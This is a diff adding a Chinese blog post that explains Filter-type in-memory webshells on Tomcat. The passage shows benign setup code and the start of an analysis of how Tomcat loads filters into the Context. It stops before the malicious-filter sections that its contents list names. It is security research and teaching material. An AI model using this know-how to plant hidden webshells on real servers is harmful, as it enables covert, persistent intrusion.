@@ -1,0 +1,509 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Leihehe"><meta name="copyright" content="Leihehe"><meta name="generator" content="Hexo 5.4.2"><meta name="theme" content="hexo-theme-yun"><title>Tomcat内存马系列(一):Filter型 | LeiH - Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-okaidia.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/png" href="/logo.png"><link rel="mask-icon" href="/logo.png" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="preload" href="/js/prism.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"leihehe.top","root":"/","title":["LeiH's","Blog"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script src="/js/prism.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap"><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="前言随着这些年来各种安全防护手段的出现，想要上传一个文件类型的webshell从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。 内存马目前分为三大类： servlet-api类  Filter型 Servlet型 Listener型  spring类  拦截器 Controller型  Java Instrumentation类  Agent型  此文将以servlet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马系列(一):Filter型">
+<meta property="og:url" content="https://leihehe.top/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/index.html">
+<meta property="og:site_name" content="LeiH - Blog">
+<meta property="og:description" content="前言随着这些年来各种安全防护手段的出现，想要上传一个文件类型的webshell从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。 内存马目前分为三大类： servlet-api类  Filter型 Servlet型 Listener型  spring类  拦截器 Controller型  Java Instrumentation类  Agent型  此文将以servlet">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145004004.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145023106.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145039178.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145106202.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145146347.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145216611.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145431939.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208150319911.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208183932159.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208184646650.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208185001033.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201730461.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201919328.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208202205923.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220131316.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220257323.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220517246.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209102528669.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209103331546.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110036049.png">
+<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110230572.png">
+<meta property="article:published_time" content="2021-12-07T04:03:42.000Z">
+<meta property="article:modified_time" content="2022-06-08T23:43:07.130Z">
+<meta property="article:author" content="Leihehe">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="Tomcat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145004004.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Leihehe"><img width="96" loading="lazy" src="/image/avatar.png" alt="Leihehe"></a><div class="site-author-name"><a href="/about/">Leihehe</a></div><span class="site-name">LeiH - Blog</span><sub class="site-subtitle"></sub><div class="site-desciption">我该说些什么呢？</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="我的主页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></div><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">39</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">23</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/leihehehe" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:hslscarlett@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat-Filter%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">Tomcat Filter流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-xml%E7%9A%84%E8%A7%A3%E6%9E%90-amp-Context%E4%BB%8E%E4%BD%95%E8%80%8C%E6%9D%A5%EF%BC%9F"><span class="toc-number">3.1.</span> <span class="toc-text">web.xml的解析&amp;Context从何而来？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E6%98%AF%E5%A6%82%E4%BD%95%E4%BB%8Econtext%E4%B8%AD%E8%A2%AB%E6%B7%BB%E5%8A%A0%E8%BF%9BfilterChain%E7%9A%84%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">Filter是如何从context中被添加进filterChain的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E7%9A%84%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.</span> <span class="toc-text">Filter的执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">Filter内存马的运用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">构造内存马思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.2.</span> <span class="toc-text">开始构造内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96context"><span class="toc-number">4.2.1.</span> <span class="toc-text">获取context</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9context-amp-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8FFilter"><span class="toc-number">4.2.2.</span> <span class="toc-text">修改context&amp;创建恶意Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.2.3.</span> <span class="toc-text">最终内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://leihehe.top/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Leihehe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="LeiH - Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Tomcat内存马系列(一):Filter型</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-12-07 15:03:42" itemprop="dateCreated datePublished" datetime="2021-12-07T15:03:42+11:00">2021-12-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2022-06-09 09:43:07" itemprop="dateModified" datetime="2022-06-09T09:43:07+10:00">2022-06-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">3.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">14m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/" style="--text-color:#F4645F" itemprop="url" rel="index"><span itemprop="text">Web Security</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web-Security/Java%E5%86%85%E5%AD%98%E9%A9%AC/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Java内存马</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web-Security/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web Security</span></a><a class="tag-item" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">内存马</span></a><a class="tag-item" href="/tags/Tomcat/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Tomcat</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着这些年来各种安全防护手段的出现，想要上传一个文件类型的<strong>webshell</strong>从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。</p>
+<p>内存马目前分为三大类：</p>
+<p><strong>servlet-api类</strong></p>
+<ul>
+<li>Filter型</li>
+<li>Servlet型</li>
+<li>Listener型</li>
+</ul>
+<p><strong>spring类</strong></p>
+<ul>
+<li>拦截器</li>
+<li>Controller型</li>
+</ul>
+<p><strong>Java Instrumentation类</strong></p>
+<ul>
+<li>Agent型</li>
+</ul>
+<p>此文将以servlet-api类的Filter类内存马开篇，详细讲解其原理、利用与检测。</p>
+<span id="more"></span>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>新建一个JAVA项目</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145004004.png" alt="image-20211208145004004" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145023106.png" alt="image-20211208145023106" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145039178.png" alt="image-20211208145039178" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145106202.png" alt="image-20211208145106202" loading="lazy"></p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145146347.png" alt="image-20211208145146347" loading="lazy"></p>
+<p>接下来就是哪里有IDEA提示就选哪里，比如下面这样的，我们直接按他的提示选fix</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145216611.png" alt="image-20211208145216611" loading="lazy"></p>
+<p>接下来在Project Structure里面把Tomcat的包引进来</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145431939.png" alt="image-20211208145431939" loading="lazy"></p>
+<p>为了方便我全部引进来了</p>
+<p>接下来在src文件夹里创建一个<strong>TestServlet</strong> Class</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再创建一个<strong>TestFilter</strong> Class</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是初始化信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">//执行过滤操作</span>
+
+        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span>servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>WEB-INF/web.xml配置：需要配置Filter一些信息 - <strong>这个配置非常重要，理解它有助于我们的分析</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>
+         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>
+         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- filter标签的内容将被存入FilterDef类 --></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>testFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- filter标签的内容将被存入FilterMap类 --></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>testFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行一下看看：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8080/testEnv_war_exploded/test">http://localhost:8080/testEnv_war_exploded/test</a></p>
+<p>控制台出现信息，就这样Filter就设置成功了。</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208150319911.png" alt="image-20211208150319911" loading="lazy"></p>
+<h1 id="Tomcat-Filter流程"><a href="#Tomcat-Filter流程" class="headerlink" title="Tomcat Filter流程"></a>Tomcat Filter流程</h1><h2 id="web-xml的解析-amp-Context从何而来？"><a href="#web-xml的解析-amp-Context从何而来？" class="headerlink" title="web.xml的解析&amp;Context从何而来？"></a>web.xml的解析&amp;Context从何而来？</h2><p>web.xml中存放着filter相关的配置，它必然会被解析读取。web.xml文件里解析出来的内容由Tomcat中的<strong>WebXml类</strong>来存储。</p>
+<p>在监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件后，<strong>WebXml</strong>将自身的存储的信息注入到Context中。</p>
+<p>具体流程如下：</p>
+<ul>
+<li><strong>ContextConfig</strong>监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件发生</li>
+<li><strong>ContextConfig</strong>调用自身的<code>configureStart()</code>方法， 再调用<code>webConfig()</code>，将/web.xml解析保存到web.xml中，再调用<code>ContextConfig.configureContext(webxml)</code>将webxml中储存的信息注入到<strong>context</strong>中。</li>
+</ul>
+<p>来看代码：</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208183932159.png" alt="image-20211208183932159" loading="lazy">监听到事件后call到<strong>webConfig()<strong>方法，在webConfig中解析web.xml的内容、创建</strong>WebXml</strong>实例。</p>
+<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208184646650.png" alt="image-20211208184646650" loading="lazy"></p>
+<p>随后用<code>ConfigureContext.configureContext(webXml)</code>将<strong>webXml</strong>的信息传入当前<strong>context</strong>中。</p>
